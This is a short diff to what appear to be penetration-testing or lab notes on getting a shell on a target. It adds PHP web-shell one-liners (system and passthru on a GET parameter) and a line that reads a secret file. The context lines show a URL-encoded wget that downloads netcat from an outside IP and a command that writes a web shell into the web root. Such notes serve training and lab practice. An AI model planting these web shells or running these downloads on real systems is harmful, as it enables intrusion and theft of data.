@@ -206,6 +206,13 @@ wget%20http://192.168.49.51:80/nc%20-O%20/var/tmp/nc%20;%20chmod%20755%20/var/tm
 If we don't have access to unique binaries but happen to know the web technology in use (such as PHP in this example), we can write our own backdoor to achieve a shell with a web shell.
 
 Example:
+```
+<?php system($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+
 -Create our web shell in the web root of the target (/var/www/html/).
 ```
 echo+"<pre><?php+passthru(\$_GET['cmd']);+?></pre>"+>+/var/www/html/webshell.php
